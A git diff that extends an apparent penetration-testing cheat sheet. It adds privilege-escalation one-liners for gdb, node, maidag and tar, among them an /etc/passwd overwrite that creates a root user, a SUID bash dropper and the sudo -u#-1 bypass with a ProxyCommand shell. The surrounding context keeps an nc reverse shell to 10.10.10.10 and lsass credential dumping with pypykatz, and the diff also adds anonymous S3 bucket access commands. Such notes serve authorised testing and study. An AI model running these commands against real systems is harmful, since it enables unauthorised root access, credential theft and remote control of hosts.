@@ -747,6 +747,24 @@ https://github.com/aaronjones111/cauldera
 # Command
 ```
 
+### AWS
+
+```bash
+======AWS CLI======
+# Install
+
+# Commands
+aws s3 ls s3://bucketname
+aws s3 cp file.txt s3://bucketname
+aws s3 rm s3://bucketname/file.txt
+aws s3 ls s3://bucketname/ --no-sign-request --region cn-northwest-1
+aws s3 mv file.txt s3://bucketname
+aws s3 cp s3://bucketname/file.txt . --no-sign-request --region cn-northwest-1
+
+# References
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/AWS%20Amazon%20Bucket%20S3/README.md
+```
+
 ### PrivescCheck.ps1
 
 ```bash
@@ -1216,6 +1234,13 @@ pip3 install pypykatz
 # Commands
 pypykatz lsa minidump lsass.dmp
 pypykatz registry --sam sam system
+```
+
+### Httpx
+
+```bash
+# Install
+GO111MODULE=on go get -v github.com/projectdiscovery/httpx/cmd/httpx
 ```
 
 ### Crackmapexec
@@ -2121,6 +2146,12 @@ https://gtfobins.github.io/gtfobins/gimp/
 # SUID
 gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 
+# SUDO
+sudo gdb -nx -ex '!sh' -ex quit
+
+# Capabilities
+gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+
 # References
 https://gtfobins.github.io/gtfobins/gdb/
 ```
@@ -2130,6 +2161,16 @@ https://gtfobins.github.io/gtfobins/gdb/
 ```bash
 # Sudo
 sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+```
+
+### Maidag
+
+```bash
+# Sudo
+- Create one file /tmp/passwd
+- echo -e "\nnewuser:c.gVrEYFACZTQ:0:0:root:/root:/bin/bash" > /tmp/passwd
+- sudo maidag --url '/etc/passwd' < /tmp/passwd
+- su newuser
 ```
 
 ### Folder (Suid)
@@ -2272,6 +2313,7 @@ sudo /sbin/initctl start test
 - touch -- "--checkpoint=1"
 - touch -- "--checkpoint-action=exec=sh shell.sh"
 - echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f" > shell.sh
+- echo "cp /bin/bash /tmp/bash; chmod u+s /tmp/bash" > shell.sh
 - chmod 777 ./"--checkpoint=1"
 - chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
 - chmod 777 shell.sh
@@ -2308,6 +2350,21 @@ vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -
 ```
 
 # D. Exploit/CVE/Abuse/Misconf
+
+### Sudo - Security Bypass
+
+```bash
+# What we will see?
+(ALL,!root) /bin/bash
+(ALL, !root) /usr/bin/ssh
+
+# Commands
+sudo -u#-1 ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+sudo -u#-1 /bin/bash
+
+# References
+https://www.exploit-db.com/exploits/47502
+```
 
 ### ShellShock
 
@@ -2850,6 +2907,11 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip,port))
 s.send(payload + b"\r\n")
 print(s.recv(1024))
+
+=======References=======
+https://medium.com/swlh/tryhackme-buffer-overflow-prep-9b2ece17a13c
+https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
+https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice.git
 ```
 
 # E. CMS/Web/Application
@@ -3114,7 +3176,22 @@ select id,name,is_admin from user;
 update user set is_admin=1 where id=3;
 ```
 
-# F. Reverse Shell
+# F. Bug Bounty
+
+### Subdomain Methodology
+
+```bash
+# crt.sh (@vict0ni)
+curl -k -s "https://crt.sh/?q=example&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+
+# Archive (@pikpikcu)
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
+
+# References
+https://reposhub.com/python/learning-tutorial/dwisiswant0-awesome-oneliner-bugbounty.html
+```
+
+# G. Reverse Shell
 
 ### PowerShell
 
